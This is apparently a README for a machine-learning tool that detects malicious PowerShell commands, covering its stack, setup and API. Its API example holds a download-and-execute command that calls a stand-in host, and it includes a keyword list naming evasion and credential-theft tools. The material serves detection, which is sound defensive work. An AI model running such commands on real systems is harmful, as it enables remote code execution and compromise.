# ThreatScanAI — AI-Based Malicious PowerShell Command Detection System

A production-ready cybersecurity web application that uses a trained **Random Forest** classifier to detect malicious PowerShell commands in real time.

---

## Screenshots

> Landing page → Dashboard → Instant AI verdict with confidence score, risk level, and suspicious keyword highlighting.

---

## Tech Stack

| Layer | Technology |
|-------|-----------|
| Backend | FastAPI, Python 3.14, scikit-learn, Uvicorn |
| ML | Random Forest + TF-IDF (pre-trained `.pkl` files) |
| Frontend | React 18, Vite, TailwindCSS, Framer Motion |
| HTTP | Axios |
| Icons | Lucide React |
| Routing | React Router v6 |

---

## Project Structure

```
IS Project/
├── start.bat                      ← Double-click to run everything
├── random_forest_model.pkl        ← Pre-trained model (not in git)
├── tfidf_vectorizer.pkl           ← Pre-trained vectorizer (not in git)
│
├── backend/
│   ├── main.py                    ← FastAPI application entry point
│   ├── requirements.txt
│   └── app/
│       ├── models/loader.py       ← Loads .pkl files at startup
│       ├── routes/predict.py      ← POST /api/v1/predict
│       └── utils/preprocessing.py ← Text normalisation + indicator extraction
│
└── frontend/
    ├── index.html
    ├── vite.config.js
    └── src/
        ├── App.jsx
        ├── main.jsx
        ├── index.css
        ├── services/api.js        ← Axios API layer
        ├── components/
        │   ├── Navbar.jsx
        │   ├── GlowCard.jsx
        │   ├── ConfidenceBar.jsx
        │   ├── IndicatorChips.jsx
        │   ├── LoadingSpinner.jsx
        │   ├── RiskBadge.jsx
        │   ├── ResultCard.jsx
        │   └── StatsCard.jsx
        └── pages/
            ├── LandingPage.jsx    ← Hero, features, CTA
            └── Dashboard.jsx      ← Detection dashboard
```

---

## Prerequisites

- **Python 3.9+** (tested on 3.14)
- **Node.js 18+** and npm
- `random_forest_model.pkl` and `tfidf_vectorizer.pkl` placed in the project root

---

## Setup

### 1 — Install backend dependencies

```powershell
cd backend
pip install -r requirements.txt
```

### 2 — Install frontend dependencies

```powershell
cd frontend
npm install
```

---

## Running the Application

### Option A — One-click (Windows)

Double-click **`start.bat`** in the project root.  
Two terminal windows open: one for the backend, one for the frontend.

### Option B — Manual (two terminals)

**Terminal 1 — Backend**
```powershell
cd backend
uvicorn main:app --reload --host 0.0.0.0 --port 8000
```

**Terminal 2 — Frontend**
```powershell
cd frontend
npm run dev
```

Then open **http://localhost:5173** in your browser.

---

## API Reference

### `POST /api/v1/predict`

Analyse a PowerShell command.

**Request**
```json
{ "command": "iex (New-Object Net.WebClient).DownloadString('http://evil.com')" }
```

**Response**
```json
{
  "prediction": "Malicious",
  "confidence": 98.47,
  "risk_level": "Critical",
  "indicators": ["iex", "webclient", "downloadstring"]
}
```

### Risk Levels

| Level | Description |
|-------|-------------|
| Safe | Benign with ≥ 90% confidence |
| Low | Benign or low-confidence malicious |
| Medium | Malicious, 50–70% confidence |
| High | Malicious, 70–85% confidence |
| Critical | Malicious, ≥ 85% confidence |

### Health Check

```
GET http://localhost:8000/health
→ { "status": "ok", "service": "PowerShell Threat Detection API" }
```

---

## Model Files (Git LFS)

The `.pkl` files are excluded from git via `.gitignore` because they are binary blobs that can be large.  
To share them with your team, use one of these approaches:

- **Git LFS** — `git lfs track "*.pkl"` then commit normally
- **Cloud storage** — upload to Google Drive / S3 and document the download link here
- **DVC** — track with [DVC](https://dvc.org/) for full ML reproducibility

---

## Suspicious Keywords Detected

`iex` · `invoke-expression` · `downloadfile` · `downloadstring` · `webclient` · `webrequest` · `virtualalloc` · `start-process` · `encodedcommand` · `-enc` · `bypass` · `hidden` · `noprofile` · `frombase64string` · `memorystream` · `reflection.assembly` · `amsiutils` · `set-mppreference` · `invoke-mimikatz` · `bitsadmin` · `certutil` · `regsvr32` · `rundll32` · `mshta` · `wscript` · `cscript`

---

## License

MIT — see `LICENSE` for details.
